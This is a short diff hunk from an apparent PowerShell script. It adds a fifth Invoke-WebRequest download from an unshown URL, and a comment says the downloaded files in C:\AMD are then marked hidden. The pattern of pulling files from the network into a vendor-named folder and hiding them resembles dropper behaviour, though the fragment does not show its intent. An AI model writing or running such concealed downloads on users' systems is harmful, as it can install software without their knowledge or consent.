@@ -29,6 +29,7 @@ Invoke-WebRequest -Uri $url1 -OutFile $destination1
 Invoke-WebRequest -Uri $url2 -OutFile $destination2
 Invoke-WebRequest -Uri $url3 -OutFile $destination3
 Invoke-WebRequest -Uri $url4 -OutFile $destination4
+Invoke-WebRequest -Uri $url5 -OutFile $destination5
 
 
 # Set the downloaded files in C:\AMD as hidden
